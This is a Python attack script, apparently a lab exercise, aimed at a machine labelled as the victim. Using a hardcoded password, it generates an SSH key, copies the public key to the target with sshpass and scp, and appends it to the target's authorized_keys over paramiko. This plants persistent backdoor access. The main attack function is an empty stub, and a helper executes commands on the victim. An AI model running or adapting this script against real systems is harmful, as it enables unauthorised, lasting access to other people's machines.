import os
import sys
import paramiko


victim, attacker = {}, {}


def init():
    print('\n[Init] Setting up environment...')

    # Create ssh key
    command = 'ssh-keygen -f ~/.ssh/victim_key\n\n'
    os.system(command)

    # Send public key to the victim
    command = 'sshpass -p {0} scp -P {1} ~/.ssh/victim_key.pub {2}@{3}:~/.ssh/'.format(victim['password'],
                                                                                       str(victim['port']),
                                                                                       victim['name'],
                                                                                       victim['ip'])
    os.system(command)

    # Concatenate public key to authorized keys
    command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys && ( chmod 600 ~/.ssh/authorized_keys )'
    ssh_command_using_name_pw(command)


def attack():
    print('\nStart attacking...')
    pass


def ssh_command_using_name_pw(command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(victim['ip'], username=victim['name'], password=victim['password'], port=victim['port'])

    session = client.get_transport().open_session()

    if session.active:
        print(command)
        session.exec_command(command)

        print('\n--------Victim Std Out--------')
        print(session.recv(2048))
        print('--------Victim Std Out--------\n')

    else:
        print('Session Failed')


def ssh_command_using_ssh_key(command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(victim['ip'], port=victim['port'], passphrase='12345')

    session = client.get_transport().open_session()

    if session.active:
        print(command)
        session.exec_command(command)

        print('\n--------Victim Std Out--------')
        print(session.recv(2048))
        print('--------Victim Std Out--------\n')

    else:
        print('Session Failed')
    pass


def set_up_user():
    print('[Victim]')
    # victim['ip'] = raw_input('ip: ')
    # victim['port'] = int(raw_input('port: '))
    # victim['name'] = raw_input('name: ')
    # victim['password'] = raw_input('password: ')

    victim['ip'] = '192.168.31.145'
    victim['port'] = 5555
    victim['name'] = 'victim'
    victim['password'] = 'victim'

    print('\n[Attacker]')
    # attacker['ip'] = raw_input('ip: ')
    # attacker['port'] = int(raw_input('port: '))
    # attacker['name'] = raw_input('name: ')
    # attacker['password'] = raw_input('password: ')

    attacker['ip'] = '192.168.31.101'
    attacker['port'] = 22
    attacker['name'] = 'victim'
    attacker['password'] = 'victim'


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':
    # Check sudo
    if is_root():
        sys.exit('Do not run the script with \'sudo\'')

    # Set up user info
    set_up_user()

    # Check ssh key if exists
    if not os.path.isfile('/home/{0}/.ssh/victim_key'.format(attacker['name'])):
        init()

    attack()
